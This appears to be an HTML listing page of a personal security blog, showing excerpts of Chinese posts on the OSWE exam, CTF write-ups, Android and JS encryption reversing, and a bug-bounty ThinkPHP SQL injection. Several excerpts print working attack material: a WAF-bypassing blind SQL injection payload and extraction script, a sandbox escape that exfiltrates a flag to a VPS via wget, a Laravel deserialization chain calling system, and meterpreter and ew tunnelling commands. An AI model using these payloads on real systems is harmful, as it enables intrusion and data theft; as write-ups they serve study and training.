@@ -1,0 +1,687 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>Posts :: Ca1s1&#39;Blog</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="" />
+<meta name="keywords" content="" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="https://vuln.top/posts/" />
+
+
+
+
+
+
+  
+  
+  
+  
+  
+  <link rel="stylesheet" href="https://vuln.top/styles.css">
+
+
+
+
+
+
+
+  <link rel="shortcut icon" href="https://vuln.top/img/theme-colors/green.png">
+  <link rel="apple-touch-icon" href="https://vuln.top/img/theme-colors/green.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="website" />
+<meta property="og:title" content="Posts">
+<meta property="og:description" content="" />
+<meta property="og:url" content="https://vuln.top/posts/" />
+<meta property="og:site_name" content="Ca1s1&#39;Blog" />
+
+  
+    <meta property="og:image" content="https://vuln.top/img/favicon/green.png">
+  
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+
+
+
+  <link href="/posts/index.xml" rel="alternate" type="application/rss+xml" title="Ca1s1&#39;Blog" />
+
+
+
+
+
+
+
+
+
+</head>
+<body class="green">
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="https://vuln.top">
+  <div class="logo">
+    Ca1s1'Blog
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="/about/">about</a></li>
+        
+      
+        
+          <li><a href="/link/">link</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+        
+          <li><a href="/about/" >about</a></li>
+        
+      
+        
+          <li><a href="/link/" >link</a></li>
+        
+      
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+  
+  <div class="posts">
+    
+      <article class="post on-list">
+        <h1 class="post-title">
+          <a href="https://vuln.top/posts/oswe/">OSWE考试总结</a>
+        </h1>
+        <div class="post-meta">
+          
+            <time class="post-date">
+              2023-06-19 ::
+            </time>
+          
+          
+            <span class="post-author">ca1s1</span>
+          
+        </div>
+
+        
+          <span class="post-tags">
+            
+            #<a href="https://vuln.top/tags/%E8%80%83%E8%AF%95/">考试</a>&nbsp;
+            
+            #<a href="https://vuln.top/tags/oswe/">oswe</a>&nbsp;
+            
+            #<a href="https://vuln.top/tags/%E8%AE%A4%E8%AF%81/">认证</a>&nbsp;
+            
+          </span>
+        
+
+        
+
+
+        <div class="post-content">
+          
+            时间记录 开始时间17日早上6点，那天正好我的代理过期了，考试网络弄了2个小时。。算是8点才开始做。
+目标 时间 第一台auth bypass 17日13:28 第一台system 17日18:32 睡觉 18日3:00-8:00 第二台auth bypass 18日9:29 第二台system 没看太累了直接结束。。 自我介绍 以前参加过几次CTF比赛，主要方向就是Web，自己审计过几套php的cms，所以不算纯小白，我把除了课件上的3道课后题做了一遍感觉难度中等，就准备预约考试了。
+考试 考试有5台机器，2台用于调试，2台目标机器，1台kali，我有oscp考试的经验，所以上去先将所有机器进行了重置（oscp没有重置遇到坑了。。），但是那天我代理正好过期了，有点倒霉，早上刚开始就浪费2个小时，但是网速情况还可以，gui远程调试基本没问题。
+难度肯定是比OSCP难的，但是相较于国内CTF还是相对简单，不需要像CTF一样考脑洞，一般情况是多个基础漏洞组合起来获得权限。主要困难是在这么多代码中找到存在漏洞的点（会有兔子洞），基本需要通读所有代码，还是比较累的。
+考试前建议认真看一遍考试规则，和考试报告的模版，这样不至于忘记截图。
+提前准备好需要用的脚本，比如sql注入脚本等等，考试的时候直接改就行。
+考试时间一定要提前预约本来我一个月前就想考了，但是已经没有周六周日的考试时间了，我只能预约下个月的，还是早上六点考试，我人迷迷糊糊的有一段时间基本都在梦游。。
+考试至少需要85分（满分100），拿到Auth Bypass 35分，获得系统权限15分，一共2台机器相当于至少要完成一个完整靶机和一个Auth Bypass。
+考试完第二天就发证书了，速度还是挺快的QAQ
+为什么要考 OSWE 这几年工作下来感觉对技术的渴望下降了不少，惰性占据上风，需要一个目标来鞭策自己，不让自己犯懒。我觉得Offensive Security 认证体系很不错，我挺喜欢的，不喜欢国内某些给钱就能过的考试，所以我定的目标是拿到OSCE3，希望能够成功。
+Try Harder
+          
+        </div>
+
+        
+          <div>
+            <a class="read-more button" href="/posts/oswe/"> →</a>
+          </div>
+        
+      </article>
+    
+      <article class="post on-list">
+        <h1 class="post-title">
+          <a href="https://vuln.top/posts/my-first-post/">MAC下微信浏览器可能可行的利用方式</a>
+        </h1>
+        <div class="post-meta">
+          
+            <time class="post-date">
+              2023-04-24 ::
+            </time>
+          
+          
+            <span class="post-author">Ca1s1</span>
+          
+        </div>
+
+        
+          <span class="post-tags">
+            
+            #<a href="https://vuln.top/tags/rce/">rce</a>&nbsp;
+            
+            #<a href="https://vuln.top/tags/%E7%A0%94%E7%A9%B6/">研究</a>&nbsp;
+            
+          </span>
+        
+
+        
+
+
+        <div class="post-content">
+          
+            在MAC下的微信浏览器，与其他浏览器不同，通过在笔记中添加协议，在用户点击后会自动执行url scheme协议，用户无需确认即可执行。
+下面列出几种可行的攻击方案，但是还没有找到一种比较完美的：
+1、通过file协议可直接执行app文件，但是前提是需要文件落地，所以需要预先将文件传输，但是如果通过http等方式下载文件运行app是会触发到mac的Gatekeep机制导致无法直接运行、而在MAC OS10.15版本后通过smb等方式传输的文件会存在LSOpenURLsWithRole() failed with error -10810错误导致无法运行，即使你全部都绕过，攻击者仍然需要在知道文件路径的情况下，再让其点击链接，所以这种攻击难度较高。
+2、通过MAC OS本身一些软件存在的URL Schemes，如果这些软件的URL Schemes存在漏洞或者可以bypass即可实现攻击，如通过cve-2020-9860，具体可以看https://blog.chichou.me/2020/07/01/x-site-escape-part-iii-cve-2020-9860-a-copycat/，但这
+种攻击方式成本较高，需要配合MACOS上的漏洞或其他常用软件打组合拳才能RCE。我通过将本地所有的URL Schemes进行遍历。
+找到ms-powerpoint:///etc/hosts，通过微软的PPT URL Schemes可以读取到本地的文件，
+具体代码如下：
+&lt;html&gt; &lt;p&gt;Loading...&lt;/p&gt; &lt;script type=&#34;text/javascript&#34;&gt; setInterval(() =&gt; {location = &#39;ms-powerpoint:///etc/hosts&#39;}, 2000) &lt;/script&gt; &lt;/html&gt; 在这种情况下其实只需要找到一种，将文件重定向到外网服务器的方法即可读取到任意文件，虽然通过测试发现smb可以不用输入账户密码即可连接vps，但是由于我基本功太菜暂时没有找到如何传输。
+3、利用自定义到URL Scheme远程突破MAC
+WINDSHIFT APT组织曾经通过该方法远程感染MACOS目标主机，在MACOS中应用程序可以“声明”自己能够支持（或者“处理”）各种文档类型以及/或者自定义的URL Scheme，且自定义的方式非常简单只需要在APP文件中的Info.plist文件加入URL Type数组即可实现，而且只需要APP文件落地到目标机器，MACOS会自动查找APP文件中Info.plist文件是否存在URL Types如果存在自动注册。
+通过MACOS默认的Safari浏览器下载压缩包，后会自动解压文件，从而文件落地自定义URL Scheme在通过点击链接触发自定义的URL Scheme。但是这种方式需要绕过Gatekeeper和文件隔离，Gatekeeper可以通过给APP文件签名绕过，文件隔离需要通过给文件名添加诱惑性文字，让其点击有点类似社工方式才能实现。虽然需要用户交互，然而这种功能已经在实际攻击活动中被成功利用。具体操作可以看https://www.anquanke.com/post/id/158679。
+          
+        </div>
+
+        
+          <div>
+            <a class="read-more button" href="/posts/my-first-post/"> →</a>
+          </div>
+        
+      </article>
+    
+      <article class="post on-list">
+        <h1 class="post-title">
+          <a href="https://vuln.top/posts/thinkphp3.1.3_sql_bypass/">thinkphp3.1.3 sql注入 bypass</a>
+        </h1>
+        <div class="post-meta">
+          
+            <time class="post-date">
+              2022-03-04 ::
+            </time>
+          
+          
+            <span class="post-author">Ca1s1</span>
+          
+        </div>
+
+        
+          <span class="post-tags">
+            
+            #<a href="https://vuln.top/tags/sql/">sql</a>&nbsp;
+            
+            #<a href="https://vuln.top/tags/bypass/">bypass</a>&nbsp;
+            
+            #<a href="https://vuln.top/tags/thinkphp/">thinkphp</a>&nbsp;
+            
+          </span>
+        
+
+        
+
+
+        <div class="post-content">
+          
+            thinkphp3.1.3 bypass sql注入 这是某次众测发现的漏洞,开始发现是thinkphp3.1.3框架，尝试了下将参数变成数组形式，返回sql报错,之后就尝试绕过waf。
+url：http://**/console/
+登陆处存在sql注入
+存在漏洞的url：http://**/console/Admin/Index/Login.shtml
+1、account参数存在sql注入，通过#a%0a可bypass waf 如下语句可造成10秒延迟，验证注入
+account[]=exp&amp;account[1]=))#a%0aunion(#a%0aselect#a%0a(#a%0aselect#a%0asleep#a%0a(10))#a%0afrom#a%0a(select#a%0asleep#a%0a(10))a)# 2、编写脚本获取数据库名:
+import requests import time u = &#34;http://**/console/Admin/Index/Login.shtml&#34; strs = &#34;ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz&#34; strs = &#34;abcdefghijklmnopqrstuvwxyz0123456789_&#34; headers = { &#34;Cookie&#34;:&#34;PHPSESSID=xxx&#34; } sess = requests.session(); sess.headers=headers xixi =&#34;&#34; def check(i,s,times=1): t1 = time.time() data = { &#34;account[]&#34;:&#34;exp&#34;, &#34;account[1]&#34;:&#34;))union#a\n(select#a\n(1)from#a\n(select if#a\n(lower((mid((database()),&#34;+str(i)+&#34;,1)))=&#39;&#34;+s+&#34;&#39;,sleep#a\n(4),0))a)#&#34;, &#34;password[]&#34;:&#34;6a&#34;, &#34;verify&#34;:&#34;6677&#34;, } print(s) r = sess.post(u,data=data,proxies={&#34;http&#34;:&#34;http://127.0.0.1:8080/&#34;}) t = time.time()-t1 if t&gt;4: if times==1: return check(i,s,times+1) return True return False for i in range(len(xixi)+1,50): for s in strs: if check(i,s)==True: xixi=xixi+s print(xixi) 
+          
+        </div>
+
+        
+          <div>
+            <a class="read-more button" href="/posts/thinkphp3.1.3_sql_bypass/"> →</a>
+          </div>
+        
+      </article>
+    
+      <article class="post on-list">
+        <h1 class="post-title">
+          <a href="https://vuln.top/posts/guanan2021wp/">观安CTF 2021 WriteUp</a>
+        </h1>
+        <div class="post-meta">
+          
+            <time class="post-date">
+              2021-09-05 ::
+            </time>
+          
+          
+            <span class="post-author">Ca1s1</span>
+          
+        </div>
+
+        
+          <span class="post-tags">
+            
+            #<a href="https://vuln.top/tags/ctf/">ctf</a>&nbsp;
+            
+            #<a href="https://vuln.top/tags/writeup/">writeup</a>&nbsp;
+            
+          </span>
+        
+
+        
+
+
+        <div class="post-content">
+          
+            WEB Baby Calc 通过测试发现该环境为python3沙盒逃逸 通过网上公开的POC发现存在代码执行，但是无法回显 尝试反弹SHELL均失败 发现系统不存在curl命令，但存在wget通过wget命令携带回显带出到vps
+如下图使用wget，把命令包含在``中在使用base64带到vps中 expr=__import__(&#34;os&#34;).__getattribute__(&#34;metsys&#34;[::-1])(&#34;wget%20http://49.234.223.23:1234/1.txt?data=`cat%20/flag_is_here|grep%20flag|base64`&#34;) vps监听： Baby WEB 题目提供了源代码，查看incloud.php文件，发现57行存在file_put_contents函数，且password未做限制。通过构造poc使password造成任意文件读取漏洞
+POC:1|../../../../../../../../flag|
+注册任意用户名，密码为POC，登陆密码为1。 登陆后返回flag Misc 老电脑的内存 经典的内存取证题目，通过imageinfo来获取该内存镜像的摘要信息 查看缓存在内存中的注册表： 获取 SAM 表中的用户： 查看内存中系统的密码： CMD5解密 通过filescan查找ctf用户下的文件 发现1.png
+volatility -f Windows\ 7-c0e05742.vmem --profile=Win7SP1x86_23418 filescan | grep ctf 将1.png dump下来，查看文件。与密码结合获得flag ##被加密的wifi 通过分析数据包发现key为88888888 通过airdecap-ng命令输入密码解密数据包 在已解密的数据包中找到flag release 拿到一张图片，首先使用binwalk分离文件，没有发现有用信息 通过winhex修改文件高度 得到一半flag 翻到文件底部发现很多20和09，想到通过二进制生成二维码，将20修改为0，09改为1 使用脚本转换为图片，得到二维码 扫描得到flag
+          
+        </div>
+
+        
+          <div>
+            <a class="read-more button" href="/posts/guanan2021wp/"> →</a>
+          </div>
+        
+      </article>
+    
+      <article class="post on-list">
+        <h1 class="post-title">
+          <a href="https://vuln.top/posts/hufuctfweb/">2021年虎符线下赛WEB</a>
+        </h1>
+        <div class="post-meta">
+          
+            <time class="post-date">
+              2021-05-09 ::
+            </time>
+          
+          
+            <span class="post-author">Ca1s1</span>
+          
+        </div>
+
+        
+          <span class="post-tags">
+            
+            #<a href="https://vuln.top/tags/ctf/">ctf</a>&nbsp;
+            
+            #<a href="https://vuln.top/tags/writeup/">writeup</a>&nbsp;
+            
+            #<a href="https://vuln.top/tags/laravel/">Laravel</a>&nbsp;
+            
+          </span>
+        
+
+        
+
+
+        <div class="post-content">
+          
+            tinypng 题目提供了源代码，通过php artisan 命令，可以看到是Laravel 8.15框架 首先查看路由信息 先查看一下fileupload路由，可以发现文件上传时对内容进行了过滤，且只允许上传png 接着我们看image路由，进入ImageController，$source可控接着判断是否为png结尾，如果为png结尾则传给imgcompress类。 进入imgcompress类，$this-&gt;src为我们传入的$source 接着又传递给compressImg类，调用了openImg方法 将$source传递给了getimagesize，getimagesize可以触发phar反序列化 现在只需要绕过文件上传内容检测即可，我们可以通过gzip的方式绕过。 从网上找一个Laravel 8的公开的反序列化POP链漏洞即可，如下给出我使用的exp。
+namespace Illuminate\Broadcasting {class PendingBroadcast {protected $events;protected $event;public function __construct($events, $event) {$this-&gt;events = $events;$this-&gt;event = $event;}}class BroadcastEvent {public $connection;public function __construct($connection) {$this-&gt;connection = $connection;}}}namespace Illuminate\Bus {class Dispatcher {protected $queueResolver;public function __construct($queueResolver){$this-&gt;queueResolver = $queueResolver;}}}namespace {$c = new Illuminate\Broadcasting\BroadcastEvent(&#39;whoami&#39;);$b = new Illuminate\Bus\Dispatcher(&#39;system&#39;);$a = new Illuminate\Broadcasting\PendingBroadcast($b, $c);#print(urlencode(serialize($a)));@unlink(&#34;phar.
+          
+        </div>
+
+        
+          <div>
+            <a class="read-more button" href="/posts/hufuctfweb/"> →</a>
+          </div>
+        
+      </article>
+    
+      <article class="post on-list">
+        <h1 class="post-title">
+          <a href="https://vuln.top/posts/jeb_debug_encrypt/">JEB_Debug_Encrypt</a>
+        </h1>
+        <div class="post-meta">
+          
+            <time class="post-date">
+              2021-05-09 ::
+            </time>
+          
+          
+            <span class="post-author">Ca1s1</span>
+          
+        </div>
+
+        
+          <span class="post-tags">
+            
+            #<a href="https://vuln.top/tags/debug/">debug</a>&nbsp;
+            
+          </span>
+        
+
+        
+
+
+        <div class="post-content">
+          
+            JEB 动态调试 加密 工具 JEB3
+BurpSuite
+Genymotion
+操作 先准备一个模拟器或安卓手机，配置好BurpSuite代理，可以抓取到如下数据包，Request和Response都已加密。
+用Jeb3打开Apk，进入Bytecode菜单，点击下方的字符串，搜索dataStr双击进入。（为啥要搜索它? 因为它在提交数据中是个协议头, 添加这些参数的时候想必都会在一个代码块, 所以加密函数也可能在附近。）
+进入后我们可以看到smali代码，在可疑的地方通过Ctrl+b可以下断点进行调试。
+模拟器内需要先打开APP，然后点击上方虫子按钮，可以看到如下图所示，点击附上。
+注意: 如果附加和调试对话框中没有模拟器的话, 你需要将模拟器目录下的adb.exe路径添加进系统环境变量path中, 如果已经添加却无法搜索到, 打开任务管理器结束adb.exe进程, 重启模拟器应该就可以了
+在模拟器内点击登陆后，JEB模拟器右上方VM/局部变量会增加几个值，但是我们无法直接看懂。
+我们需要修改Type类型，从int改为string，修改后我们可以看到变量当前处在内存中的值，F6可以进行单步调试，局部变量的值也会随之改变。
+我们已经了解了如何进行断点调试，通过分析java代码看下整个的加密过程
+dataStr是我们的加密字符串，先是调用了getEncodeJsonStr，双击进入看一下
+arg6是我们传入的值，我们设置断点看一下
+如下图可以看到v6是我们传入的数据进行了json转换，那么我们只要跟着v6走就能找到加密过程。
+我们继续往下，v6传入了encodeMesJsonByPassword中，传入了4个值分别为Token，requestAesKey，v6，TERMINAL_TYPE
+如下图Token是#@!1234567890!@#，requestAesKey是1234567890123456，v6是json格式的明文
+TERMINAL_TYPE还不知道我们双击进去，是afAndriod
+几个变量都知道了那我们双击进入encodeMesJsonByPassword函数，可以看到v2是一个随机的AesSecretKey，将等于过滤为空，先不管他。
+如下图signature=md5(terminalType+token+timestamp)，terminalType=afAndriod、token=#@!1234567890!@#、timestamp为一个随机值，暂时无法构造。
+继续往下看arg6，将&amp;timestamp=xxx+&amp;signature=xxx进行了一次base64，和上面的arg6一起进入encryptPinfo函数。上面的arg6为requestAesKey=1234567890123456
+接着进入encryptPinfo函数，arg3=base64(&amp;timestamp=xxx+&amp;signature=xxx),arg4=1234567890123456,看下加密发现是AES/CBC/PKCS5Padding加密。
+有了KEY，我们需要找到IV，点击进入IsIvParameter_Pinfo，如下图Iv值为0123456789abcdef
+有了IV和KEY，还有加密算法我们需要对加密字符串进行解密，通过在线AES解密即可得到。
+在进行一次base64，获得明文
+          
+        </div>
+
+        
+          <div>
+            <a class="read-more button" href="/posts/jeb_debug_encrypt/"> →</a>
+          </div>
+        
+      </article>
+    
+      <article class="post on-list">
+        <h1 class="post-title">
+          <a href="https://vuln.top/posts/ctfneiwang/">CTF内网渗透题</a>
+        </h1>
+        <div class="post-meta">
+          
+            <time class="post-date">
+              2020-10-15 ::
+            </time>
+          
+          
+            <span class="post-author">Ca1s1</span>
+          
+        </div>
+
+        
+          <span class="post-tags">
+            
+            #<a href="https://vuln.top/tags/ctf/">ctf</a>&nbsp;
+            
+            #<a href="https://vuln.top/tags/writeup/">writeup</a>&nbsp;
+            
+          </span>
+        
+
+        
+
+
+        <div class="post-content">
+          
+            记一次CTF内网渗透，据说是从护网复现过来的。
+这是第一个flag。。。 既然我们知道这是wordpress正常套路那我们通过wpscan扫描一下
+如下图发现存在xmlrpc.php，根据经验这个php存在用户密码爆破，那我们尝试一下 参考：Wordpress xmlrpc.php -common vulnerabilites &amp; how to exploit them 通过文章发布的地方知道存在一个power_admin的用户 通过xmlrpc.php验证一下 不知道为什么是不是我个人问题输入正确账号密码后没有直接给我跳转到wp-admin/index.php页面还是在原来页面。我只能通过替换cookie后直接访问。 在媒体库内直接上传冰蝎一句话后访问正常操作 之后通过冰蝎配合msf反弹shell 内网穿透我比较常用的手法是通过ew配合proxychains 如何通过EW做Socks5代理进行内网渗透 - 知乎 ew for linux下载地址：ew
+首先在公网的vps上通过ew监听1080和1024 ./ew_for_linux64 -s rcsocks -l 1080 -e 1024 &amp; 之后通过msf把ew客户端上传到靶机上
+meterpreter &gt; upload /root/ew/ew_for_linux64 /tmp/ [*] uploading : /root/ew/ew_for_linux64 -&gt; /tmp/ [*] uploaded : /root/ew/ew_for_linux64 -&gt; /tmp//ew_for_linux64 meterpreter &gt; meterpreter &gt; shell Process 20657 created. Channel 0 created. cd /tmp chmod 777 ew_for_linux64 ./ew_for_linux64 -s rssocks -d 118.
+          
+        </div>
+
+        
+          <div>
+            <a class="read-more button" href="/posts/ctfneiwang/"> →</a>
+          </div>
+        
+      </article>
+    
+      <article class="post on-list">
+        <h1 class="post-title">
+          <a href="https://vuln.top/posts/2019shendun/">2019神盾杯</a>
+        </h1>
+        <div class="post-meta">
+          
+            <time class="post-date">
+              2020-08-23 ::
+            </time>
+          
+          
+            <span class="post-author">Ca1s1</span>
+          
+        </div>
+
+        
+          <span class="post-tags">
+            
+            #<a href="https://vuln.top/tags/ctf/">ctf</a>&nbsp;
+            
+            #<a href="https://vuln.top/tags/writeup/">writeup</a>&nbsp;
+            
+            #<a href="https://vuln.top/tags/php/">php</a>&nbsp;
+            
+            #<a href="https://vuln.top/tags/js/">js</a>&nbsp;
+            
+          </span>
+        
+
+        
+
+
+        <div class="post-content">
+          
+            首届“神盾杯”上海市网络安全竞赛，去年的比赛。
+0x00 babyJS 操作内容：
+查看源码 找不到被调用的CheckLogin函数
+看到script中有用到unespace和escape等函数 用于编码字符串
+将eval传参改为alert 显示为弹窗
+发现check函数 并将flag与用户输入做比较 得到flag
+FLAG值：
+flag{a5a5f402f6dc62acd3e848900a17513f}
+0x01 crypto_easy_1 操作内容：
+下载文件
+发现3行类似的数据 并且长度一致。
+:左边的长度为42 右边的长度为56 ，猜测右边被base64编码过 进行解码 比较长度
+长度一致 为42
+异或运算一下 可以得到Key随后将key代入 与base64解码后的密文异或比较 得到flag
+解密脚本如下:
+import base64 x = &#39;v6&#34;wo5UIP9c4IdCk1o6qZhhB5DKZhVBwBzONl1JRIz:TwB2RyZYBCEVbjBjID17UkUeeDAwPBh1dg86AyAgcSQ4QygYGnAuJQYw&#39; y = &#39;zjS0ubQE2hw29FL2qs61ZNOVyFaf6IAjUZ7X8ijuVg:Q1wHADwPAC13PyRlUB90CwUCeHAwGj9hOg0QP34/cjkvY1AOTigOAhkt&#39; z = &#39;pJryZpVUNpSFi06WlKGkS0Uka6zw1sNCX&#34;h2urQoyg:SXwmSRMdBz0LJwARAGkObhg6CSo5ZCVcIn0LLnkFfRAiGw9kAzM1GDYt&#39; a, b = x.split(&#39;:&#39;) c, d = y.split(&#39;:&#39;) e, f = z.split(&#39;:&#39;) b = base64.b64decode(b) d = base64.b64decode(d) f = base64.b64decode(f) g = base64.b64decode(&#39;X1o1VzIPaVgjbmNvCnQAC0ZHY3BbMUkaeylDYWVOCzZDXwJjR3hTFiw3&#39;) flag = &#39;&#39; for i in range(42): t = ord(a[i]) ^ ord(b[i]) flag += chr(ord(g[i]) ^ t) print(flag) FLAG值：
+          
+        </div>
+
+        
+          <div>
+            <a class="read-more button" href="/posts/2019shendun/"> →</a>
+          </div>
+        
+      </article>
+    
+      <article class="post on-list">
+        <h1 class="post-title">
+          <a href="https://vuln.top/posts/burpjsencrypt/">jsEncrypter 加密</a>
+        </h1>
+        <div class="post-meta">
+          
+            <time class="post-date">
+              2020-08-04 ::
+            </time>
+          
+          
+            <span class="post-author">Ca1s1</span>
+          
+        </div>
+
+        
+          <span class="post-tags">
+            
+            #<a href="https://vuln.top/tags/burpsuite/">burpsuite</a>&nbsp;
+            
+            #<a href="https://vuln.top/tags/encrypt/">encrypt</a>&nbsp;
+            
+          </span>
+        
+
+        
+
+
+        <div class="post-content">
+          
+            burp 爆破 JS加密 首先右键登录按钮属性查看html源代码，发现id=&lsquo;rsa&rsquo;
+ctrl+shift+f 查找rsa描点，发现调用了strEnr
+继续查找strEnr，并进入函数
+对加密函数添加断点进行判断，发现123123账号密码进入了此处，且3个key分别为1，2，3。
+我们直接控制台调用，尝试加密解密
+保存des.js到本地
+既然找到了加密解密函数现在就是通过burp调用函数使其加解密,修改phantomjs_server.js
+载入server.js
+burp连接server端口，test，我们现在已经可以成功加密了
+配置burp intruder，添加变量
+选择Custom ，1为用户
+2为密码
+添加payload加密
+start attack，成功爆破
+尝试解密下加密字符串，成功
+          
+        </div>
+
+        
+          <div>
+            <a class="read-more button" href="/posts/burpjsencrypt/"> →</a>
+          </div>
+        
+      </article>
+    
+      <article class="post on-list">
+        <h1 class="post-title">
+          <a href="https://vuln.top/posts/wandouctf/">豌豆杯入学CTF</a>
+        </h1>
+        <div class="post-meta">
+          
+            <time class="post-date">
+              2019-10-16 ::
+            </time>
+          
+          
+            <span class="post-author">Ca1s1</span>
+          
+        </div>
+
+        
+          <span class="post-tags">
+            
+            #<a href="https://vuln.top/tags/ctf/">ctf</a>&nbsp;
+            
+            #<a href="https://vuln.top/tags/writeup/">writeup</a>&nbsp;
+            
+            #<a href="https://vuln.top/tags/php/">php</a>&nbsp;
+            
+          </span>
+        
+
+        
+
+
+        <div class="post-content">
+          
+            1.题目:小可爱 第一步肯定是绕过本地回环地址 一开始想到的是x-forward-for等告诉服务器我的地址但发现没有绕过 看题目题目是说来源地址想到了referer成功绕过 这里没啥思路只能爆破 密码为orange 访问到另外一个页面 然后登录。 发现是一张迪丽热巴的图片 这个主管很喜欢迪丽热巴啊！！ 将图片下载下来，用binwalk查看下发现有压缩包!foremost下得到压缩包发现有密码 这个地方解了很久发现使用Dilraba的md5。。。。 得到一张图片再一次foremost得到一个压缩包成功拿到flag 2.题目:单身二十年 &lt;?php header(&#34;Content-type:text/html;charset=utf-8&#34;); show_source(__FILE__); if($_COOKIE[&#39;token&#39;]==&#39;5D41402ABC4B2A76B9719D911017C592&#39;){ $file = &#39;dump/&#39;.md5(base64_encode(mt_rand(1,100))).&#39;.txt&#39;; file_put_contents($file,file_get_contents(&#39;327A6C4304AD5938EAF0EFB6CC3E53DC.php&#39;)); sleep(10); unlink($file); }else{ header(&#39;Location: index.php&#39;); } setcookie(&#34;token&#34;); ?&gt; 看懂源码发现访问页面会睡眠十秒他会把flag写入到一个1到100随机数字经过base64,md5的txt文件里。 一种是用burp直接get到这里我就不演示了,我是直接写的python,访问下页面执行脚本就行了。 import base64 import hashlib import requests for i in range(1,101): headers = {&#39;Content-type&#39;:&#39;text/html;charset=utf-8&#39;} encodestr = base64.b64encode(str(i).encode(&#39;utf-8&#39;)) cookies = {&#39;token&#39;:&#39;5D41402ABC4B2A76B9719D911017C592&#39;} #print(encodestr) m = hashlib.md5() m.update(encodestr) #print(m.hexdigest()) a = m.hexdigest() url = &#39;http://106.14.145.133:8081/web10/dump/&#39;+a+&#39;.txt&#39; #print(url) url_get = requests.get(url,headers=headers,cookies=cookies,timeout=2) #print(url_get.headers) #print(url_get.cookies) if url_get.
+          
+        </div>
+
+        
+          <div>
+            <a class="read-more button" href="/posts/wandouctf/"> →</a>
+          </div>
+        
+      </article>
+    
+
+    <div class="pagination">
+  <div class="pagination__buttons">
+    
+    
+      <a href="/posts/page/2/" class="button next">
+        <span class="button__text">Older posts</span>
+        <span class="button__icon">→</span>
+      </a>
+    
+  </div>
+</div>
+
+  </div>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2023 Powered by <a href="http://gohugo.io">Hugo</a></span>
+    
+      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
